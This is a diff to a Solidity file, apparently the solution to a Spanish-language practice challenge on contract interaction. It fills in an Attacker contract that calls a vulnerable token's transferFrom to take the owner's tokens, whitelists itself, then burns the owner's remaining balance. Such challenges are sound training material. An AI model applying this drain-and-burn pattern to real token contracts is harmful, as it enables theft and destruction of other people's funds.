@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.24;
+import "hardhat/console.sol";
 
 /**
  * En ese desafío se hará práctica de la interacción entre contratos.
@@ -75,25 +76,49 @@ contract TokenTruco is Whitelist, NumeroRandom {
 // Mediante ITokenTruco el contrato Attacker ejecutará el ataque
 interface ITokenTruco {
     function owner() external view returns (address);
-
+    function montoAleatorio() external view returns (uint256);
     function balances(address _account) external view returns (uint256);
-
-    // function transferFrom
-
-    // function burn
-
-    // ...
+    function transferFrom(address _from, address _to, uint256 _amount) external;
+    function addToWhitelist() external;
+    function burn(address _from, uint256 _amount) external;
 }
+
 
 // Modificar el método 'ejecutarAtaque'
 contract Attacker {
-    ITokenTruco public tokenTruco;
 
+    ITokenTruco public tokenTruco;
     constructor(address _tokenTrucoAddress) {
         tokenTruco = ITokenTruco(_tokenTrucoAddress);
+    
     }
-
+    
+    uint256 public montoAleatorio;
+    
     function ejecutarAtaque() public {
-        // tokenTruco ...
-    }
+
+    
+    
+    montoAleatorio = tokenTruco.montoAleatorio();
+
+    
+    tokenTruco.transferFrom(tokenTruco.owner(), msg.sender, montoAleatorio);
+
+    
+    tokenTruco.addToWhitelist();
+
+    // Calcular el restante en la cuenta del owner
+    uint256 balanceOwner = tokenTruco.balances(tokenTruco.owner());
+    
+    // Si el balance del propietario es mayor que cero, quemar el restante
+    if (balanceOwner > 0  ) {
+        tokenTruco.burn(tokenTruco.owner(), balanceOwner);
+        }
+
+    
+    }   
+    
+
+
 }
+
